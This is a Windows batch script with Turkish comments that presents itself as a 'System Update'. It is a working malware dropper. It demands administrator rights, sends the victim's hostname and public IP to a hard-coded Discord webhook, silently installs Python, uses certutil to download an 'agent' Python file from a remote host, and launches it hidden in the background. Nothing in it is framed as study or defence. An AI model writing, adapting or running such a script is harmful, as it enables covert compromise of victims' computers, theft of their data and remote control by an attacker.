@echo off
:: YÖNETİCİ YETKİLERİNİ KONTROL ET
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Bu dosya Yönetici olarak calistirilmalidir!
    pause
    exit
)

title System Update
chcp 65001 >nul
cd /d "%TEMP%"

:: 1. Bilgi Toplama
for /f "tokens=*" %%a in ('hostname') do set "HOST=%%a"
for /f "tokens=*" %%b in ('curl -s https://api.ipify.org') do set "IP=%%b"

:: 2. Discord'a Bildirim Gönder (Karakter sorunu olmayan en temiz yöntem)
set "WEBHOOK=https://discord.com/api/webhooks/1514118771776688164/dKNF5PnIXuS8-ERE-c-JTWzOWl1U_bYZuVZ5yYCcqKAcCoPw6FqQi7S_MxrP7LMA1f-0"
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"✅ Yeni bağlantı! Bilgisayar: %HOST% | IP: %IP%\"}" "%WEBHOOK%" >nul 2>&1

:: 3. Python Kurulu mu Kontrol Et
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python kuruluyor...
    curl -L -o "py_setup.exe" https://www.python.org/ftp/python/3.12.3/python-3.12.3-amd64.exe
    start /wait "" "py_setup.exe" /quiet InstallAllUsers=1 PrependPath=1
    del "py_setup.exe"
)

:: 4. Ajan dosyasını indir ve çalıştır
set "AGENT_URL=http://192.168.0.50:8000/ajan.py"
certutil -urlcache -split -f "%AGENT_URL%" "sys_infra.pyw" >nul 2>&1

:: 5. Ajanı arka planda başlat
start "" pythonw "sys_infra.pyw"

exit
